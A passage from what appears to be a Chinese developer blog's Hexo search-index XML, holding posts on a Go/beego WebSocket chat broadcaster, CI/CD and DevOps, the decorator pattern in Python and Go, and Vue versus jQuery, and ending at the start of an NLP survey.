class="type">string</span>(msgStr)</span><br><span class="line">        message &lt;- msg</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="3）后端广播功能"><a href="#3）后端广播功能" class="headerlink" title="3）后端广播功能"></a>3）后端广播功能</h5><p>将发消息、用户加入、用户退出三种情况都广播给所有用户。后两种情况经过处理，转换为第一种情况。真正发送信息给客户端的，只有第一种情况。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">broadcaster</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="comment">// 哪个case可以执行，则转入到该case。若都不可执行，则堵塞。</span></span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">            <span class="comment">// 消息通道中有消息则执行，否则堵塞</span></span><br><span class="line">            <span class="keyword">case</span> msg := &lt;-message:</span><br><span class="line">                str := fmt.Sprintf(<span class="string">&quot;broadcaster-----------%s send message: %s\n&quot;</span>, msg.Name, msg.Message)</span><br><span class="line">                beego.Info(str)</span><br><span class="line">                <span class="comment">// 将某个用户发出的消息发送给所有用户</span></span><br><span class="line">                <span class="keyword">for</span> client := <span class="keyword">range</span> clients &#123;</span><br><span class="line">                    <span class="comment">// 将数据编码成json形式，data是[]byte类型</span></span><br><span class="line">                    <span class="comment">// json.Marshal()只会编码结构体中公开的属性(即大写字母开头的属性)</span></span><br><span class="line">                    data, err := json.Marshal(msg)</span><br><span class="line">                    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                        beego.Error(<span class="string">&quot;Fail to marshal message:&quot;</span>, err)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// fmt.Println(&quot;=======the json message is&quot;, string(data))	// 转换成字符串类型便于查看</span></span><br><span class="line">                    <span class="keyword">if</span> client.conn.WriteMessage(websocket.TextMessage, data) != <span class="literal">nil</span> &#123;</span><br><span class="line">                        beego.Error(<span class="string">&quot;Fail to write message&quot;</span>)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 有用户加入</span></span><br><span class="line">            <span class="keyword">case</span> client := &lt;-join:</span><br><span class="line">                str := fmt.Sprintf(<span class="string">&quot;broadcaster-----------%s join in the chat room\n&quot;</span>, client.name)</span><br><span class="line">                beego.Info(str)</span><br><span class="line"></span><br><span class="line">                clients[client] = <span class="literal">true</span>	<span class="comment">// 将用户加入映射</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// 将用户加入消息放入消息通道</span></span><br><span class="line">                <span class="keyword">var</span> msg Message</span><br><span class="line">                msg.Name = client.name</span><br><span class="line">                msg.EventType = <span class="number">1</span></span><br><span class="line">                msg.Message = fmt.Sprintf(<span class="string">&quot;%s join in, there are %d preson in room&quot;</span>, client.name, <span class="built_in">len</span>(clients))</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 此处要设置有缓冲的通道。因为这是goroutine自己从通道中发送并接受数据。</span></span><br><span class="line">                <span class="comment">// 若是无缓冲的通道，该goroutine发送数据到通道后就被锁定，需要数据被接受后才能解锁，而恰恰接受数据的又只能是它自己</span></span><br><span class="line">                message &lt;- msg</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 有用户退出</span></span><br><span class="line">            <span class="keyword">case</span> client := &lt;-leave:</span><br><span class="line">                str := fmt.Sprintf(<span class="string">&quot;broadcaster-----------%s leave the chat room\n&quot;</span>, client.name)</span><br><span class="line">                beego.Info(str)</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 如果该用户已经被删除</span></span><br><span class="line">                <span class="keyword">if</span> !clients[client] &#123;</span><br><span class="line">                    beego.Info(<span class="string">&quot;the client had leaved, client&#x27;s name:&quot;</span>+client.name)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">delete</span>(clients, client)	<span class="comment">// 将用户从映射中删除</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// 将用户退出消息放入消息通道</span></span><br><span class="line">                <span class="keyword">var</span> msg Message</span><br><span class="line">                msg.Name = client.name</span><br><span class="line">                msg.EventType = <span class="number">2</span></span><br><span class="line">                msg.Message = fmt.Sprintf(<span class="string">&quot;%s leave, there are %d preson in room&quot;</span>, client.name, <span class="built_in">len</span>(clients))</span><br><span class="line">                message &lt;- msg</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在后端服务启动时，便开启广播功能：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> broadcaster()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此处需要利用<code>goroutine</code>并发模式，使得该函数能独立在额外的一个线程上运作。</p>
<h3 id="五、参考文档"><a href="#五、参考文档" class="headerlink" title="五、参考文档"></a>五、参考文档</h3><ul>
<li><p><a href="https://blog.csdn.net/aslackers/article/details/72466730">Golang实战-一个聊天室的实现</a></p>
</li>
<li><p><a href="https://github.com/beego/samples/tree/master/WebIM">beego官网聊天室样例</a></p>
</li>
<li><p><a href="https://www.jianshu.com/p/f0b7b832cc22">[实战]基于Go实现Web聊天室(3种方式)</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>开发</category>
        <category>后端</category>
      </categories>
      <tags>
        <tag>后端</tag>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>聊聊CI/CD与DevOps</title>
    <url>/%E8%81%8A%E8%81%8ACI-CD%E4%B8%8EDevOps.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>实习期间，组长给每位实习生布置了一份作业——关于CI&#x2F;CD，devops的个人理解和可行性。实话实说，我最喜欢带薪学习了。</p>
<span id="more"></span>

<h2 id="1-从瀑布模型谈起"><a href="#1-从瀑布模型谈起" class="headerlink" title="1. 从瀑布模型谈起"></a>1. 从瀑布模型谈起</h2><p>在谈起CI&#x2F;CD、DevOps等之前，不得不提起软件工程开发模型的鼻祖——瀑布模型。</p>
<p>20世纪70年代，软件工程概念刚刚被提出，温斯顿·罗伊斯（Winston Royce）就提出了著名的<strong>瀑布模型</strong>。</p>
<p>瀑布模型将软件开发过程分为：需求分析、详细设计、编码、测试、运行维护等几大阶段，如下图：</p>
<p><img src="/%E8%81%8A%E8%81%8ACI-CD%E4%B8%8EDevOps/1.png" alt="pic"></p>
<p>瀑布模型对软件开发的过程进行了严格的划分，并规范了各阶段的文档要求和质量保证。相信学过软件工程的同学，对此肯定是再熟悉不过了。而且在个人项目中，大多都是这样开发模式。</p>
<p>但，瀑布模型存在着其显著的缺点：每个阶段必须依赖于前一阶段的完成，缺乏并行性；一旦进行开发阶段，需求很难变更；每个阶段周期长，软件交付周期长达数月甚至数年，导致用户反馈不及时，很多的问题在最后才会暴露出来。</p>
<p>20世纪末期，软件需求剧增，瀑布模型已经不能满足软件工作者了。于是，迭代模型、快速原型模型、螺旋模型等新一代软件开发模型逐渐涌现出来。</p>
<p>到了21世纪初，软件工程大师们总结了当时轻量级的软件开发方法，进而提出了<strong>敏捷开发</strong>。</p>
<h2 id="2-敏捷开发"><a href="#2-敏捷开发" class="headerlink" title="2. 敏捷开发"></a>2. 敏捷开发</h2><p>时至今日，<strong>敏捷开发（agile development）</strong> 已经成为了非常流行的软件开发方法。</p>
<p>敏捷开发并未提出相关的模型或者工具，更多的是一种概念。以我理解，它的核心是<strong>迭代开发</strong>和<strong>增量开发</strong>：</p>
<ul>
<li>迭代开发：将开发分为很多个小周期，每个小周期都包括着分析、设计、编码、测试、发布等步骤。</li>
<li>增量开发：迭代开发中，并没有说明如何划分迭代，而增量开发则是按照新增功能来划分迭代。</li>
</ul>
<p>简单地来说，在敏捷开发中，开发者可以尽早地发布一个具有核心功能但不完善的简单版本，然后不断迭代地进行更新。如下图：</p>
<p><img src="/%E8%81%8A%E8%81%8ACI-CD%E4%B8%8EDevOps/2.png" alt="pic"></p>
<p>举个似是而非的例子，去餐馆点10个菜，如果是瀑布模型，可能把10个菜做完一起上，而敏捷开发则是先上第一个主菜，然后接着上后续的菜。</p>
<p>显然可以看出，敏捷开发的首要优点就是<strong>快速上线</strong>，而快速上线则能及时地得到用户反馈，进而可以不断地完善、贴近市场、降低软件风险，甚至调整软件方向。</p>
<p>在这个市场日新月异的时代，敏捷开发更符合大多数开发者的口味。</p>
<p>敏捷开发的4个价值观：</p>
<blockquote>
<ul>
<li>程序员的主观能动性，以及程序员之间的互动，优于既定流程和工具。</li>
<li>软件能够运行，优于详尽的文档。</li>
<li>跟客户的密切协作，优于合同和谈判。</li>
<li>能够响应变化，优于遵循计划。</li>
</ul>
</blockquote>
<h2 id="3-DevOps"><a href="#3-DevOps" class="headerlink" title="3. DevOps"></a>3. DevOps</h2><p>如果说敏捷开发是已经存在20年的老大哥，那 DevOps 就是初出茅庐的小青年。</p>
<p>DevOps 概念于2009年被提出，与敏捷开发一样，它也是一种软件开发方法。并且，它也没有明确的定义，更多的像是一种文化、一个运行。有人会认为 DevOps 属于敏捷开发，也有人认为并不如此。</p>
<p>DevOps 提出的初衷是打破开发人员（Development）和运维人员（Operations）之间的壁垒（线上发布80%的问题可以甩锅给运维，同样也可以甩锅给开发），突出重视软件开发人员和运维人员的沟通合作。开发即运维，运维即开发。</p>
<p><img src="/%E8%81%8A%E8%81%8ACI-CD%E4%B8%8EDevOps/4.png" alt="pic"></p>
<p>同时，你也可以把 DevOps 看作开发、运维和质量保障（QA）三者的交集。</p>
<p><img src="/%E8%81%8A%E8%81%8ACI-CD%E4%B8%8EDevOps/3.png" alt="pic"></p>
<p>在我看来，DevOps 是敏捷开发的继承，也是发展。敏捷开发强调“短平快”的开发节奏，而 DevOps 则在这基础上，进一步强调开发与运维的关系。同时，DevOps 的发展也得益于自动化工具的不断完善，以及容器、K8S、云服务等新技术的出现。尤其是容器和K8S发展起来后，DevOps 更加火热了。</p>
<p>而这些自动化工具、新技术的加入，逐渐形成了 DevOps 的整套开发流程：计划，编码，构建，测试，发布，部署，运维，监控，反馈，使得 DevOps 更加敏捷方便。如下图所示：</p>
<p><img src="/%E8%81%8A%E8%81%8ACI-CD%E4%B8%8EDevOps/5.png" alt="pic"></p>
<h2 id="4-CI-x2F-CD"><a href="#4-CI-x2F-CD" class="headerlink" title="4. CI&#x2F;CD"></a>4. CI&#x2F;CD</h2><p>如果说 DevOps 是一种软件开发方法的话，那么 CI&#x2F;CD 就是 DevOps 的一些实践。</p>
<p><strong>CI（Continuous Integration，持续集成）</strong>，指的是开发人员持续地（不断地）向 master 分支提交代码。提交之后，自动化工具（如：Jenkins）会自动拉取代码，并进行自动化构建和测试，最终将结果发聩给开发人员。CI 使开发人员以一个个的小功能为目标，频繁地向主干分支提交代码，从而进行频繁的构建和测试，让错误能更早地暴露给开发人员，降低软件的风险。</p>
<p><strong>CD（Continuous Delivery，持续交付）&#x2F;（Continuous Deployment，持续部署）</strong>，CD 有两个解释，对于两者的区别，似乎也没有明确的定义。在我看来，持续部署，指的是 CI 完成后，自动化地将产品部署到生产测试环境进行测试；而持续交付，是指如果部署没有产生问题，则交付给用户。</p>
<p><img src="/%E8%81%8A%E8%81%8ACI-CD%E4%B8%8EDevOps/6.png" alt="pic"></p>
<p>可以看出，CI&#x2F;CD 的重点在于：<strong>持续</strong>与<strong>自动化</strong>。持续，是为了测试能够更加的频繁，从而保证产品的质量；而自动化，则使整个流程更加的便捷，大大地节约了时间与人力成本。</p>
<p>当然，CI&#x2F;CD 并不只属于 DevOps ，DevOps 也不是只有 CI&#x2F;CD 。</p>
<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><p>从瀑布模型到 DevOps ，软件开发方法越来越完善，软件开发也越来越高效、快速。DevOps 所提倡的开发与运维间的协作、自动化的流水线、持续的集成部署交付等，是值得推崇的。但是，并不能为了 DevOps 而做 DevOps，更不能以频繁的发布次数为荣。我们在享受持续与自动化带来的快速与便捷同时，也要关注代码的质量。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://juejin.im/post/6844903808317800462">强推！2019年最火的容器、K8S和DevOps入门都在这了</a></li>
<li><a href="https://www.infoq.cn/article/WHt0wFMDRrBU-dtkh1Xp">如何从零开始搭建 CI&#x2F;CD 流水线</a></li>
<li><a href="https://blog.jjonline.cn/linux/238.html">DevOps漫谈之一：DevOps、CI、CD都是什么鬼？</a></li>
<li><a href="https://catchzeng.com/2019/04/02/DevOps-%E6%98%AF%E4%B8%80%E7%A7%8D%E6%80%8E%E6%A0%B7%E7%9A%84%E4%BD%93%E9%AA%8C/">DevOps 是一种怎样的体验?</a></li>
</ul>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>软件工程</category>
      </categories>
      <tags>
        <tag>后端</tag>
        <tag>DevOps</tag>
      </tags>
  </entry>
  <entry>
    <title>装饰器模式</title>
    <url>/%E8%A3%85%E9%A5%B0%E5%99%A8%E6%A8%A1%E5%BC%8F.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>装饰器模式是一种结构型设计模式，它可以<strong>向现有对象动态地添加任意功能，而不改变其原本结构</strong> 。</p>
<span id="more"></span>

<h2 id="面向对象中的装饰器"><a href="#面向对象中的装饰器" class="headerlink" title="面向对象中的装饰器"></a>面向对象中的装饰器</h2><p><img src="/%E8%A3%85%E9%A5%B0%E5%99%A8%E6%A8%A1%E5%BC%8F/1.png" alt="1"></p>
<p>由图可知，具体装饰器类Concrete Decorators继承Component接口类，与具体部件类Concrete Component一样拥有execute方法。但不同在于，Concrete Decorators的execute方法，是在被装饰对象wrappee的execute方法的基础上添加额外功能。而这个被装饰对象wrappee，既可以是具体部件类，也可以是装饰器类。</p>
<p>使用时，用户可用多层装饰器来包裹部件，整体呈一个链式关系：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">c = <span class="keyword">new</span> <span class="built_in">ConcreteDecoratorA</span>(<span class="keyword">new</span> <span class="built_in">ConcreteDecoratorB</span>(<span class="keyword">new</span> <span class="built_in">ConcreteComponent</span>()))</span><br><span class="line">c.<span class="built_in">execute</span>()</span><br></pre></td></tr></table></figure>

<p>最终调用execute方法时，会依次调用<code>ConcreteDecoratorA.execute() → ConcreteDecoratorB.execute() → ConcreteComponent.execute()</code>。</p>
<h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p>有一家奶茶店，提供多种类型的奶茶：奶青、乌龙奶茶、椰奶奶茶等等。当然，奶茶也可以加料，配料有椰果、珍珠、仙草等等。刚开始售卖奶茶时，奶茶店将奶茶与配料捆绑在一起，就会出现一份椰果的乌龙奶茶、一份珍珠的椰奶奶茶、一份椰果与一份珍珠的椰奶奶茶等，这样不仅使奶茶种类变得臃肿，还丧失了灵活性。顾客体验很差，生意自然就不好。</p>
<p>但好巧不巧，老板无意中学习到了装饰器模式，幡然醒悟，将奶茶与配料拆开，让顾客先选择奶茶，再添加任意配料。如此，顾客就有非常自由且丰富的选择。顾客高兴了，生意自然就好起来了，奶茶店也有了好盼头。</p>
<p>在这个例子中，奶茶就是Component接口类，配料就是Base Decorator类。一杯奶茶Concrete Component被生产出来后，可以向其中添加任意类型和数量的配料Concrete Decorators。</p>
<h3 id="自问自答"><a href="#自问自答" class="headerlink" title="自问自答"></a>自问自答</h3><p>为什么不把Decorators作为Component类的一个数组属性？然后在execute时依次调用Decorators中 的方法呢？</p>
<p>首先，这样需要修改Component类的结构和内容。而在实际中，往往是先有Component再有Decorator，甚至Component是不允许修改的。</p>
<p>其次，缺乏灵活性。不同Decorator可能有不同的行为，有些Decorator想在execute方法被调用之前做处理，有些则想在之后做处理。</p>
<p>而装饰器模式既不用修改被装饰对象，又保证了灵活性。</p>
<h2 id="面向过程中的装饰器"><a href="#面向过程中的装饰器" class="headerlink" title="面向过程中的装饰器"></a>面向过程中的装饰器</h2><p>面向对象通常离我们较远，而真正让我领会到装饰器模式厉害之处的，是在面向过程的编程中。</p>
<h3 id="Python中的装饰器"><a href="#Python中的装饰器" class="headerlink" title="Python中的装饰器"></a>Python中的装饰器</h3><p>编写函数时我总有一个习惯，在函数的开头打印函数开始与函数参数，并在函数结尾打印函数结束与函数返回值。如此，打印输出的逻辑顺序较为清晰，就可以较为轻松地进行调试。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">funcA</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;++++++ funA begin ++++++&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(ret)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------ funA end ------&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">funcA(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>但是，如果每个函数都添加这些步骤，重复性又太高，代码将充满坏味道。有一种方法是定义专门的函数如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># args 参数数组，kwargs 参数字典</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_log</span>(<span class="params">func, *args, **kwargs</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;++++++ <span class="subst">&#123;func.__name__&#125;</span> begin ++++++&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(*args, **kwargs)</span><br><span class="line">    ret = func(*args, **kwargs)</span><br><span class="line">    <span class="built_in">print</span>(ret)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;------ <span class="subst">&#123;func.__name__&#125;</span> end ------&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">funcA</span>(<span class="params">s</span>):</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="comment"># old: funcA(1)</span></span><br><span class="line">func_log(funcA, <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>这样虽然能复用，但原来通过<code>funcA(1)</code>，现在要通过<code>func_log(funcA, 1)</code>的形式调用。<strong>改变了代码的原本结构</strong> ，这是我们不想看到的。</p>
<p>于是，装饰器模式登场了。装饰器模式的本质在于：<strong>传入一种类型的变量或对象，在不改变其原有结构的基础上进行装饰加工，最终返回相同类型的变量或对象。</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">log_decorator</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;++++++ <span class="subst">&#123;func.__name__&#125;</span> begin ++++++&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;===&gt; args:<span class="subst">&#123;args&#125;</span>, kwargs:<span class="subst">&#123;kwargs&#125;</span>&quot;</span>)</span><br><span class="line">        ret = func(*args, **kwargs)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&lt;=== return:<span class="subst">&#123;ret&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;------ <span class="subst">&#123;func.__name__&#125;</span> end ------&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">funcA</span>(<span class="params">s</span>):</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">funcA = log_decorator(funcA) <span class="comment"># 使用装饰器装饰</span></span><br><span class="line">...</span><br><span class="line">funcA(<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用装饰器后，既能在函数的调用前后添加额外功能，又不会改变函数的内容和调用方式。这已经非常完美了，但还能更完美。在python中，还提供了装饰器语法糖<code>@</code>，使装饰器的使用更加方便：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">log_decorator</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;++++++ <span class="subst">&#123;func.__name__&#125;</span> begin ++++++&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;===&gt; args:<span class="subst">&#123;args&#125;</span>, kwargs:<span class="subst">&#123;kwargs&#125;</span>&quot;</span>)</span><br><span class="line">        ret = func(*args, **kwargs)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&lt;=== return:<span class="subst">&#123;ret&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;------ <span class="subst">&#123;func.__name__&#125;</span> end ------&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@log_decorator </span><span class="comment"># 使用装饰器装饰</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">funcA</span>(<span class="params">s</span>):</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">funcA(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Go中的装饰器"><a href="#Go中的装饰器" class="headerlink" title="Go中的装饰器"></a>Go中的装饰器</h3><p>只要在一门语言中函数是一等公民，那这门语言就可以使用过程式的装饰器。因而，Go语言也可以编写过程式的装饰器。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">  <span class="string">&quot;log&quot;</span></span><br><span class="line">  <span class="string">&quot;runtime&quot;</span></span><br><span class="line">  <span class="string">&quot;reflect&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Func <span class="function"><span class="keyword">func</span><span class="params">(s <span class="type">string</span>)</span></span> <span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getFuncName</span><span class="params">(i <span class="keyword">interface</span>&#123;&#125;)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> runtime.FuncForPC(reflect.ValueOf(i).Pointer()).Name()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">logDecorator</span><span class="params">(fn Func)</span></span> Func &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(s <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    funcName := getFuncName(fn)</span><br><span class="line">    log.Printf(<span class="string">&quot;===&gt; %s arg: %v\n&quot;</span>, funcName, s)</span><br><span class="line">    ret := fn(s)</span><br><span class="line">    log.Printf(<span class="string">&quot;&lt;=== %s ret: %v\n&quot;</span>, funcName, ret)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">funcA</span><span class="params">(s <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">  s = <span class="string">&quot;hello &quot;</span> + s</span><br><span class="line">  <span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  fn := logDecorator(funcA)</span><br><span class="line">  fn(<span class="string">&quot;decorator&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是，Go语言是一门强类型语言，它无法做到python那样将一个装饰器应用到任意函数上。在Go语言中，只能对同一类型的函数（参数与返回值都相同）编写专门的装饰器，这与面向对象的装饰器相似。同时，它也暂不支持装饰器语法糖。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>装饰器模式，尤其是面向过程的装饰器，可以将许多小功能（如打印日志、计算运行时间、参数预处理等）作为装饰器，灵活地组合在一起，大大提高代码的复用性。</p>
<p>其实，装饰器模式这种“<strong>只提供最基础本体，而将附加功能作为装饰器</strong> ”的思想，不仅适用于代码编写，还适用于方方面面。比如，当今后端框架越来越趋于小而轻，而不是大而重，框架只需提供最基础的功能，而附加功能可通过插件的形式进行补充，这样就能使得用户的选择更加灵活多样。再比如，奶茶中的配料、烹饪时的佐料等等，都是装饰器模式思想的体现。</p>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>软件工程</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>谈谈vue与jQuery</title>
    <url>/%E8%B0%88%E8%B0%88vue%E4%B8%8EjQuery.html</url>
    <content><![CDATA[<h2 id="无题"><a href="#无题" class="headerlink" title="无题"></a>无题</h2><p>虽然十分不想搭理前端，也不想过多去接触开发，但无奈接了多个前端的锅，也确实花费了我大量的时间在前端开发上(摊手)。总而言之，我的前端开发能力，虽然依旧菜得抠脚，但也有一些小小的感悟。</p>
<p>我曾想用<code>vue</code>+<code>bootstrap</code>搭建一个前端项目，但在此过程中，却遇到了一个问题：<br>在<code>bootstrap</code>中，要实现对其中一些<strong>组件</strong>的操作，官网的示例都是使用<code>jQuery</code>进行的，<code>bootstrap</code>本身也是与<code>jQuery</code>紧密结合的。而我却是采用<code>vue</code>————一个不擅于操作DOM(文档对象模型 Document Object Model)元素的框架。</p>
<span id="more"></span>

<p>用过<code>jQuery</code>的人，应该能深刻体会到其操作DOM元素的便捷。而，<code>bootstrap</code>+<code>jQuery</code> 的组合在以前更是无往而不利。</p>
<p>但，奈何我用的是<code>vue</code>。<code>vue</code> 主张对DOM元素渲染，而不是操作。网上找寻 <code>vue</code>实现DOM操作 的答案，答案中有实现的方法，却又不主张这样做。</p>
<p>这就令我这个想在<code>vue</code>中使用<code>bootstrap</code>组件的人，寸步难行了。同时，也给我带来了深深的不解，为什么<code>vue</code>中不支持便捷的DOM操作呢？难道仅仅为了提高速度吗？</p>
<p>终于，在网上的一个回答中，我找到了<a href="https://forum.vuejs.org/t/vue-dom/5710/3">答案</a>。</p>
<p>原来，<code>vue</code> 是一种前端的<a href="http://baijiahao.baidu.com/s?id=1596277899370862119&wfr=spider&for=pc"><code>MVVM</code>框架(模型-视图-视图模型)</a>。因此，<strong>我们不应该去操作视图，而应该去操作数据，然后让数据响应到视图中去。</strong></p>
<p>答案中的一句话，也令我醍醐灌顶：</p>
<blockquote>
<p>这样做的根源在于，视图应该是数据的反应，而不是数据本身。这样，我们才能把“业务逻辑”和“视图逻辑”去分开。降低耦合，降低维护成本，提升开发效率。</p>
</blockquote>
<p>不过，道理明白了，可问题还没解决。<code>bootstrap</code>本身就是适合<code>jQuery</code>的，那要如何去操作<code>bootstrap</code>中的组件呢？那就不用吧。</p>
<p>此时，<a href="https://www.iviewui.com/"><code>iview</code></a>便应运而生了。这是<code>vuejs</code>中著名的开源框架之一。该框架提供了丰富的组件库，而组件对应的逻辑操作都是<code>vuejs</code>模式的，使用起来十分舒畅。</p>
<p>但<code>bootstrap</code>强大的CSS布局样式，也令人依依不舍。</p>
<p>于是，我决定最终项目的框架使用为：<code>vue</code>+<code>iview</code>组件+<code>bootstrap</code>布局</p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>总言道，前端不如后端，其实不然。在如今，不仅后端在飞速发展，前端也呈现大爆炸的景象。两者可谓齐头并进了。而我也仅仅接触了前端的冰山一角，前端的世界丰富难言。</p>
<p>不过，后端真香。</p>
]]></content>
      <categories>
        <category>开发</category>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>自然语言处理综述</title>
    <url>/%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86%E7%BB%BC%E8%BF%B0.html</url>
    <content><![CDATA[<h2 id="1-引言"><a href="#1-引言" class="headerlink" title="1. 引言"></a>1. 引言</h2><p>自然语言是指人类日常使用的语言，比如：中文、英语、日语等。自然语言灵活多变，是人类社会的重要组成部分，但它却不能被计算机很好地理解。为了实现用自然语言在人与计算机之间进行沟通，自然语言处理诞生了。自然语言处理(Natural Language Processing, NLP)是一个融合了语言学、计算机科学、数学等学科的领域，它不仅研究语言学，更研究如何让计算机处理这些语言。它主要分为两大方向：自然语言理解(Natural language Understanding, NLU)和自然语言生成(Natural language Generation, NLG)，前者是听读，后者是说写。</p>
<p>本文将从自然语言处理的历史与发展讲起，进而分析目前深度学习在自然语言处理领域的研究进展，最后讨论自然语言处理的未来发展方向。</p>
<span id="more"></span>

